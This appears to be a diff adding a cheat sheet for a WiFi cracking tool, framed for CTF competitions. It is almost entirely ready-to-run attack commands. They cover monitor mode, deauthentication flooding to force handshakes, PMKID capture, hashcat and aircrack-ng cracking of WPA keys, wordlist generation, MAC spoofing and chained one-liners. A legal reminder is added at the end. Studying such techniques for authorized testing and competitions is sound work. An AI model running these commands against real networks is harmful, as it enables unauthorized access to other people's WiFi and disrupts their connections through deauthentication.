@@ -1,0 +1,302 @@
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                     WiFiCrack CTF Cheat Sheet                                ║
+║                  Quick Reference for WiFi Password Cracking                  ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ QUICK START                                                                  │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Interactive Mode (Easiest):
+    sudo ./quick-start.sh
+
+  Full Installation:
+    ./install-wificrack.sh
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ NETWORK SCANNING                                                             │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Scan for networks:
+    sudo ./wificrack.py capture -i wlan0 --scan
+
+  Manual scan with airodump:
+    sudo airodump-ng wlan0mon
+
+  Scan specific channel:
+    sudo airodump-ng -c 6 wlan0mon
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ HANDSHAKE CAPTURE                                                            │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Auto capture (with scan):
+    sudo ./wificrack.py capture -i wlan0 --scan
+
+  Manual capture:
+    sudo ./wificrack.py capture -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6
+
+  Using airodump directly:
+    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w output wlan0mon
+
+  Send deauth to force handshake:
+    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ PMKID CAPTURE (Clientless - Faster!)                                        │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Capture PMKID:
+    sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=15
+
+  Convert to hashcat:
+    hcxpcapngtool -o pmkid.22000 pmkid.pcapng
+
+  One-liner:
+    sudo hcxdumptool -i wlan0 -o p.pcapng --enable_status=15 && \
+    hcxpcapngtool -o p.22000 p.pcapng
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ PASSWORD CRACKING                                                            │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  With WiFiCrack (auto-detect format):
+    ./wificrack.py crack -f handshake.22000 -w wordlist.txt --hashcat
+
+  Hashcat (fastest):
+    hashcat -m 22000 handshake.22000 wordlist.txt --force
+
+  Aircrack-ng:
+    aircrack-ng -w wordlist.txt handshake.cap
+
+  With rules (recommended):
+    hashcat -m 22000 hash.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ WORDLIST GENERATION                                                          │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Generate with WiFiCrack:
+    ./wificrack.py wordlist -o custom.txt -p password admin CompanyName
+
+  Using crunch (pattern-based):
+    crunch 8 8 -t wifi@@@@ -o wifi-pins.txt    # wifi + 4 digits
+    crunch 10 10 -t router%%%% -o pins.txt     # router + 4 numbers
+
+  Combine wordlists:
+    cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ FILE CONVERSION                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  CAP to hashcat 22000:
+    hcxpcapngtool -o output.22000 input.cap
+
+  PCAPNG to hashcat:
+    hcxpcapngtool -o output.22000 input.pcapng
+
+  Using WiFiCrack:
+    ./wificrack.py convert -i input.cap -o output.22000
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ MONITOR MODE                                                                 │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Enable monitor mode:
+    sudo airmon-ng start wlan0
+
+  Disable monitor mode:
+    sudo airmon-ng stop wlan0mon
+
+  Manual enable:
+    sudo ip link set wlan0 down
+    sudo iw dev wlan0 set type monitor
+    sudo ip link set wlan0 up
+
+  Kill interfering processes:
+    sudo airmon-ng check kill
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ VERIFICATION                                                                 │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Check if handshake captured:
+    aircrack-ng handshake.cap
+    # Look for "1 handshake" in output
+
+  Verify hash file:
+    hcxpcapngtool handshake.cap
+    # Should show EAPOL/PMKID records
+
+  Check hashcat status:
+    hashcat -m 22000 hash.22000 wordlist.txt --status
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ HASHCAT MODES                                                                │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  22000 - WPA/WPA2/WPA3 (modern, use this!)
+  22001 - WPA/WPA2/WPA3 PMKID only
+  2500  - WPA/WPA2 (legacy .hccapx)
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ OPTIMIZATION                                                                 │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Hashcat with GPU:
+    hashcat -m 22000 -d 1 hash.22000 wordlist.txt
+
+  Optimize workload:
+    hashcat -m 22000 -w 3 hash.22000 wordlist.txt
+
+  Use optimized kernel:
+    hashcat -m 22000 -O hash.22000 wordlist.txt
+
+  Show devices:
+    hashcat -I
+
+  Multi-threaded aircrack:
+    aircrack-ng -w wordlist.txt -p $(nproc) handshake.cap
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ CTF STRATEGIES                                                               │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Strategy 1: PMKID First (Fastest)
+    1. sudo hcxdumptool -i wlan0 -o p.pcapng --enable_status=15
+    2. hcxpcapngtool -o p.22000 p.pcapng
+    3. hashcat -m 22000 p.22000 rockyou.txt
+
+  Strategy 2: Quick Dictionary
+    1. ./wificrack.py wordlist -o quick.txt
+    2. hashcat -m 22000 hash.22000 quick.txt
+
+  Strategy 3: Targeted Attack (with hints)
+    1. Create wordlist based on hints
+    2. Use crunch for patterns
+    3. Apply hashcat rules
+
+  Strategy 4: Full Rockyou
+    1. Download rockyou.txt (14M passwords)
+    2. hashcat -m 22000 hash.22000 rockyou.txt
+    3. Use rules: -r /usr/share/hashcat/rules/best64.rule
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ COMMON PATTERNS                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  WiFi passwords often follow patterns:
+    - Company/Router name + year (Admin2024)
+    - Dictionary word + numbers (password123)
+    - Phone numbers (10 digits)
+    - Dates (DDMMYYYY, MMDDYYYY)
+    - Default passwords (admin, password, 12345678)
+
+  Generate pattern wordlist:
+    for i in {0..999}; do echo "wifi$i"; done > wifi-nums.txt
+    for y in {2020..2025}; do echo "admin$y"; done > admin-years.txt
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ TROUBLESHOOTING                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Monitor mode not working:
+    sudo airmon-ng check kill
+    sudo airmon-ng start wlan0
+
+  No handshake captured:
+    - Increase timeout: -t 300
+    - More aggressive deauth: aireplay-ng -0 0 -a <BSSID> wlan0mon
+    - Try PMKID instead
+
+  Hashcat not using GPU:
+    hashcat -I                    # Check GPU detection
+    sudo apt install nvidia-opencl-dev  # For NVIDIA
+    sudo apt install mesa-opencl-icd    # For AMD
+
+  Invalid handshake:
+    - Capture longer (more EAPOL frames)
+    - Get closer to AP (better signal)
+    - Try different client
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ USEFUL COMMANDS                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  List wireless interfaces:
+    iw dev
+
+  Check interface mode:
+    iwconfig
+
+  Change MAC address:
+    sudo macchanger -r wlan0
+
+  Check signal strength:
+    sudo airodump-ng wlan0mon
+
+  Download rockyou wordlist:
+    wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+  View hashcat session:
+    hashcat --session=mysession --restore
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ ONE-LINER CTF SOLUTIONS                                                      │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  Complete PMKID attack:
+    sudo hcxdumptool -i wlan0 -o c.pcapng && \
+    hcxpcapngtool -o c.22000 c.pcapng && \
+    hashcat -m 22000 c.22000 rockyou.txt --force
+
+  Quick handshake + crack:
+    sudo ./wificrack.py capture -i wlan0 --scan && \
+    hashcat -m 22000 handshake.22000 rockyou.txt
+
+  Generate + crack:
+    ./wificrack.py wordlist -o w.txt -p admin wifi && \
+    hashcat -m 22000 hash.22000 w.txt
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ WORDLIST RESOURCES                                                           │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  RockYou (14M passwords):
+    https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+  SecLists WiFi:
+    git clone https://github.com/danielmiessler/SecLists.git
+    Use: SecLists/Passwords/WiFi-WPA/
+
+  WiFi-Default-Passwords:
+    https://github.com/routerkeygen/routerkeygenPC
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ TIPS & TRICKS                                                                │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  1. Try PMKID first - much faster than waiting for handshakes
+  2. Start with small wordlists before using rockyou
+  3. Use GPU acceleration (hashcat) when possible
+  4. Read CTF hints carefully - often reveal password patterns
+  5. Get close to AP for better signal strength
+  6. Verify handshake before starting long cracks
+  7. Use rules to multiply your wordlist effectiveness
+  8. Save all captures - you might need to re-crack
+  9. Monitor hashcat speed - should be >100k pwd/s with GPU
+  10. For CTF, password is usually in top 10k of rockyou
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ LEGAL REMINDER                                                               │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+  ⚠️  ONLY use on networks you own or have written authorization to test!
+  ⚠️  Unauthorized access to networks is ILLEGAL
+  ⚠️  This tool is for CTF competitions and authorized testing ONLY
+
+╔══════════════════════════════════════════════════════════════════════════════╗
+║  For detailed documentation, see: WIFICRACK-README.md                        ║
+║  For interactive mode, run: sudo ./quick-start.sh                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
